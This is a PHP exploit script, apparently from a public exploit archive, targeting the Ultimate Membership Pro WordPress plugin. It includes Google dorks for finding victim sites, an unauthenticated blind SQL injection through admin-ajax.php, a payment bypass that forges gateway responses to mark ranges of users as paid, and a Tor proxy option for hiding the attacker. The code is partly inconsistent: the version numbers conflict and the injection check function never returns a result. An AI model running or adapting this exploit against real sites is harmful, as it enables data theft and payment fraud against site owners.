/**
 * Exploit Title: Ultimate Membership Pro WordPress Plugin Exploit
 * Google Dorks: inurl:"lid=0" OR inurl:"lid=1" ...  inurl:"lid=100" "Register" "Confirm Password"
 * Exploit Author: wp0Day.com <contact@wp0day.com>
 * Vendor Homepage: http://wpindeed.com/
 * Version: 3.3
 * Tested on: Debian 8, PHP 5.6.17-3
 * Type: Unauthenticated Blind SQLi, Unauthenticated Payment Bypass
 * Time line: Found [07-Jun-2016], Vendor notified [08-Jun-2016], Vendor fixed: [Yes], [RD:1466846149]
 */
 
 
require_once(&#039;curl.php&#039;);
//OR
//include(&#039;https://raw.githubusercontent.com/svyatov/CurlWrapper/master/CurlWrapper.php&#039;);
$curl = new CurlWrapper();
 
 
$options = getopt("t:m:l:e:s:",array(&#039;tor:&#039;));
print_r($options);
$options = validateInput($options);
 
if (!$options){
    showHelp();
}
 
if ($options[&#039;tor&#039;] === true)
{
    echo " ### USING TOR ###\n";
    echo "Setting TOR Proxy...\n";
    $curl->addOption(CURLOPT_PROXY,"http://127.0.0.1:9150/");
    $curl->addOption(CURLOPT_PROXYTYPE,7);
    echo "Checking IPv4 Address\n";
    $curl->get(&#039;https://dynamicdns.park-your-domain.com/getip&#039;);
    echo "Got IP : ".$curl->getResponse()."\n";
    echo "Are you sure you want to do this?\nType &#039;wololo&#039; to continue: ";
    $answer = fgets(fopen ("php://stdin","r"));
    if(trim($answer) != &#039;wololo&#039;){
        die("Aborting!\n");
    }
    echo "OK...\n";
}
 
function isTrue($sql){
    global $curl, $options;
    $levels = "&#039;) union all select (SELECT CASE WHEN ($sql) then 1 else 1*(select table_name from information_schema.tables) end)#";
    $data = array(
        &#039;shortcode&#039;=>&#039;[ihc-list-users filter_by_level="1" levels_in="&#039;.$levels.&#039;" theme="ihc-theme_1" ]&#039;
    );
    $curl->post($options[&#039;t&#039;].&#039;/wp-admin/admin-ajax.php&#039;, $data);
    $resp = $curl->getResponse();
}
 
function exploit(){
    global $curl, $options;
 
    if ($options[&#039;m&#039;] == &#039;pay&#039;){
        $level = $options[&#039;l&#039;];
        for($i=$options[&#039;s&#039;]; $i<$options[&#039;e&#039;]; $i++){
            //This is mental, no IP or Hash check!
            echo "Paying Level $level to UserID: $i\n";
            $data = array(&#039;x_MD5_Hash&#039;=>&#039;1&#039;, &#039;x_response_code&#039;=>&#039;1&#039;, &#039;x_cust_id&#039;=>$i, &#039;x_po_num&#039;=>$level);
            $curl->post($options[&#039;t&#039;].&#039;wp-content/plugins/indeed-membership-pro/authorize_response.php&#039;, $data);
            //echo $curl->getResponse();
        }
    }
    if ($options[&#039;m&#039;] == &#039;sql&#039;){
        $query = $options[&#039;s&#039;];
        echo "&#039;Running&#039; SQL Query: $query\n";
        echo "Getting Length";
        $max_length = 100;
        //Well, it is messed up, can use , (comma) in the query
        //Binary search or divide et impera is possible with the BETWEEN operator
        //Code it yourself :)
        $len = 0;
        for ($i=1;$i<$max_length;$i++){
            $sql_len = "(select char_length( ($query) ) = $i )";
            if (isTrue($sql_len)){
                echo "\nLength found: $i\n";
                $len = $i;
                break;
            } else {
                echo ".";
            }
        }
        if ($len !== 0 ){
            echo "Reading char by char\nResponse:\n";
        } else {
            die("Failed getting length!\nAboring.\n\n");
        }
        $charset = &#039;etaoinsrhdluc@*1234567890.mfywgpbvkxqjzETAOINSRHDLUCMFYWGPBVKXQJZ&#039;;
        for ($i=1;$i<$len;$i++){
            $got = false;
            for ($j=0;$j<strlen($charset);$j++){
                $chr = $charset[$j];
                $question = "SELECT substr(($query) FROM $i FOR 1) = &#039;$chr&#039; ";
                if (isTrue($question)){
                    echo $charset[$j];
                    $got = true;
                    break;
                }
            }
            if (!$got){
                echo "?";
            }
        }
        echo "\n\n";
 
    }
}
 
exploit();
 
function validateInput($options){
 
    if ( !isset($options[&#039;t&#039;]) || !filter_var($options[&#039;t&#039;], FILTER_VALIDATE_URL) ){
        return false;
    }
 
    if (!isset($options[&#039;m&#039;]) || !in_array($options[&#039;m&#039;], array(&#039;sql&#039;, &#039;pay&#039;) ) ){
        return false;
    }
    if ($options[&#039;m&#039;] == &#039;sql&#039; && !isset($options[&#039;s&#039;])) {
        return false;
    }
 
    if ($options[&#039;m&#039;] == &#039;pay&#039; && ( !isset($options[&#039;s&#039;]) || !isset($options[&#039;e&#039;]) || !isset($options[&#039;l&#039;]))) {
        return false;
    }
    if ($options[&#039;m&#039;] == &#039;pay&#039; && ( !is_numeric($options[&#039;s&#039;]) || !is_numeric($options[&#039;e&#039;]) || !is_numeric($options[&#039;l&#039;]) )) {
        echo "In pay mode -s -e and -l must be numeric!\n";
        return false;
    }
 
    $options[&#039;tor&#039;] = isset($options[&#039;tor&#039;]);
 
    return $options;
}
 
 
function showHelp(){
    global $argv;
    $help = <<<EOD
 
     Ultimate Membership Pro 8.4.1.3 WordPress Plugin Exploit
 
 
Usage: php $argv[0] -t [TARGET URL] --tor [USE TOR?] -m [MODE] -s [QUERY] -s [START] -e [END] -l [LEVEL]
 
       [MODE] sql  - Blind SQL Inject mode*
              pay  - Payment bypass. Parameters -l Level ID (&lid=XX in the url), -s Start UserID, -e End UserID
 
       *Note: You can&#039;t use , (comma) in the query.
 
Examples:
       php $argv[0] -t http://localhost/ --tor=yes -m sql -s &#039;select user()&#039;
       php $argv[0] -t http://localhost/ --tor=yes -m pau -s 0 -e 1000 -l 1
 
       Marks all users with UserID between 0 and 1000 as paying customer for level ID 1
 
    Misc:
           CURL Wrapper by Leonid Svyatov <leonid@svyatov.ru>
           @link http://github.com/svyatov/CurlWrapper
           @license http://www.opensource.org/licenses/mit-license.html MIT License
 
EOD;
    echo $help."\n\n";
    die();
}

